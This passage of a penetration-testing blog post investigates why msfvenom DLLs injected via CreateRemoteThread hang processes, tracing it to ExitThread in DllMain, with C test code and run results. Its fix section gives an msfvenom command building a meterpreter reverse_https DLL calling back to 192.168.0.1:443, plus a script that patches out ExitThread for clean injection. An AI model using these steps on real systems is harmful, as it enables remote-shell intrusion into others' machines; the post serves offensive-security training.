</span></span></code></pre></div><h3 id=samplebad>SampleBad</h3><p><code>SampleBad</code> does pretty much the same what <code>SampleGood</code> does. However, the <code>DoStuff</code> function emulates what the DLL generated by <code>msfvenom</code> does and calls <code>ExitThread(0)</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>DoStuff</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Hello world from a bad DLL &#39;(?_?)&#39;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Calling ExitThread</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ExitThread</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=running-the-poc>Running the PoC</h2><p>Let&rsquo;s run the <code>Injectee</code> application and make it load the <code>SampleGood</code> library to get a base line. Since we&rsquo;re not using any problematic functions, we can see that the library load and unload work correctly and since we&rsquo;re unloading the library after each load, we can load it multiple times.</p><p><img src=/posts/dllmain-and-threads/run-with-samplegood.png width=752 height=455 srcset="/posts/dllmain-and-threads/run-with-samplegood_hu49169600ce0ac9e1fd05a6337d820535_34109_480x0_resize_box_3.png 480w, /posts/dllmain-and-threads/run-with-samplegood_hu49169600ce0ac9e1fd05a6337d820535_34109_1024x0_resize_box_3.png 1024w" loading=lazy alt="Running with SampleGood" class=gallery-image data-flex-grow=165 data-flex-basis=396px></p><p>As we see from the image above, we can load and unload multiple times, and when we exit the process, everything works correctly. It&rsquo;s important to note that on each load, the main thread outputs <em>&ldquo;Trying to load [library name]&rdquo;</em>, while the thread created to load and unload the library outputs <em>"[Thread] - Trying to load library"</em>.</p><p>Let&rsquo;s now run the <code>Injectee</code> application and load the <code>SampleBad</code> library.</p><p><img src=/posts/dllmain-and-threads/run-with-samplebad.png width=749 height=455 srcset="/posts/dllmain-and-threads/run-with-samplebad_huf1a87fdc3900ce45cf2a0130c39db0f2_25816_480x0_resize_box_3.png 480w, /posts/dllmain-and-threads/run-with-samplebad_huf1a87fdc3900ce45cf2a0130c39db0f2_25816_1024x0_resize_box_3.png 1024w" loading=lazy alt="Running with SampleBad" class=gallery-image data-flex-grow=164 data-flex-basis=395px></p><p>There are multiple things that we notice now:</p><ul><li>We don&rsquo;t see the message that the DLL has been detached</li><li>When we try to re-load the library, not only is the DLL not re-loaded, we don&rsquo;t even see the message from the thread that we&rsquo;re trying to load a library</li><li>The process hangs when we try to exit the process</li></ul><p>Using the <code>Injector</code> project in our PoC code, we can also confirm that this happens with <code>CreateRemoteThread</code>. When we inject the <code>SampleGood</code> first and then the <code>SampleBad</code>, both DLLs are loaded, meaning that <code>CreateRemoteThread</code> ran in both cases (regardless of the fact that after loading <code>SampleBad</code> we&rsquo;re not able to run it anymore).</p><p><img src=/posts/dllmain-and-threads/inject-good-then-bad.png width=752 height=459 srcset="/posts/dllmain-and-threads/inject-good-then-bad_hub192ea7010beba79611110cad4313271_24453_480x0_resize_box_3.png 480w, /posts/dllmain-and-threads/inject-good-then-bad_hub192ea7010beba79611110cad4313271_24453_1024x0_resize_box_3.png 1024w" loading=lazy alt="Injecting SampleGood first and then SampleBad, we see that both DLLs are loaded" class=gallery-image data-flex-grow=163 data-flex-basis=393px></p><p>On the contrary, loading <code>SampleBad</code> first, we see that <code>CreateRemoteThread</code> does not work when we request to load <code>SampleGood</code>.</p><p><img src=/posts/dllmain-and-threads/inject-bad-then-good.png width=753 height=376 srcset="/posts/dllmain-and-threads/inject-bad-then-good_hu2836abc0be3441628bace5a906b39fa2_19309_480x0_resize_box_3.png 480w, /posts/dllmain-and-threads/inject-bad-then-good_hu2836abc0be3441628bace5a906b39fa2_19309_1024x0_resize_box_3.png 1024w" loading=lazy alt="Injecting SampleBad first and then SampleGood, we see that only the first DLL is loaded" class=gallery-image data-flex-grow=200 data-flex-basis=480px></p><h2 id=results>Results</h2><p>From the previous section, we can build a hypothesis about what is happening:</p><ul><li>Since we never see the <code>DLL_PROCESS_DETACH</code> message when <code>ExitThread</code> is called, we can safely assume that <code>LoadLibrary</code> never returned. <code>LoadLibrary</code> should return when a <code>DllMain</code> returns with any value.</li><li>With the DLL loading/unloading thread stuck in <code>LoadLibrary</code>, we can also assume that the thread is also still running.</li><li>Both <code>CreateThread</code> (to load new DLLs) and <code>ExitProcess</code> (via the return from the main function) are not executing. From our research, we know that <code>ExitThread</code>, <code>ExitProcess</code>, <code>CreateThread</code> and <code>CreateRemoteThread</code> calls are serialized, meaning only one of them can run within all threads of a process. This suggests some sort of lock that <code>ExitThread</code> is keeping.</li></ul><p>Research and results show that <code>ExitThread</code> is indeed the issue. It also suggests that a lock is holding new threads from executing. Going back to our original question <code>explorer.exe</code> typically creates and destructs threads as needed, so locking the thread creation and deletion process would cause it to malfunction and eventually crash.</p><h2 id=fix>Fix</h2><p>After all this, we concluded that removing <code>ExitThread</code>, we would be able to correctly inject the DLL generated by <code>msfvenom</code>. For this reason, I created a python3 script which can be run on both a 64-bit and 32-bit DLL. The script looks for the bytes in the DLL that perform the <code>ExitThread</code> call and NOPs it out. This script can be found <a class=link href=https://gist.github.com/reubensammut/958333cd112b6bbe4883787950fc831d target=_blank rel=noopener>here</a> and can be run using the following command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msfvenom -p windows/x64/meterpreter/reverse_https LHOST<span style=color:#f92672>=</span>192.168.0.1 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>	-f dll -o met.dll
</span></span><span style=display:flex><span>python3 remove_exitthread_msf.py met.dll
</span></span></code></pre></div><h2 id=references>References</h2><ul><li><a class=link href=https://www.offsec.com/courses/pen-300/ target=_blank rel=noopener>PEN-300 Course from OffSec</a></li><li><a class=link href=https://www.metasploit.com/ target=_blank rel=noopener>metasploit framework</a></li><li><a class=link href=https://github.com/reubensammut/InjectPoC target=_blank rel=noopener>PoC code for this blog post</a></li><li><a class=link href=https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain target=_blank rel=noopener>DllMain documention on MSDN</a></li><li><a class=link href=https://github.com/rapid7/metasploit-framework/blob/d29f5690a172cbe6741bff9165dc2d133c222ecc/data/templates/src/pe/dll/template.c target=_blank rel=noopener>DLL template used by metasploit</a></li><li><a class=link href=https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices target=_blank rel=noopener>Dynamic-Link Library Best Practices</a></li><li><a class=link href=https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread target=_blank rel=noopener>CreateRemoteThread function</a></li><li><a class=link href=https://gist.github.com/reubensammut/958333cd112b6bbe4883787950fc831d target=_blank rel=noopener>Gist to remove the <code>ExitThread</code></a></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/dllmain/>dllmain</a>
<a href=/tags/threads/>threads</a>
<a href=/tags/pen-300/>pen-300</a>
<a href=/tags/offsec/>offsec</a>
<a href=/tags/process-injection/>process injection</a>
<a href=/tags/loadlibrary/>loadlibrary</a>
<a href=/tags/createremotethread/>createremotethread</a>
<a href=/tags/metasploit/>metasploit</a></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><footer class=site-footer><section class=copyright>&copy;
2023 -
2023 Reuben Sammut's blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.16.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>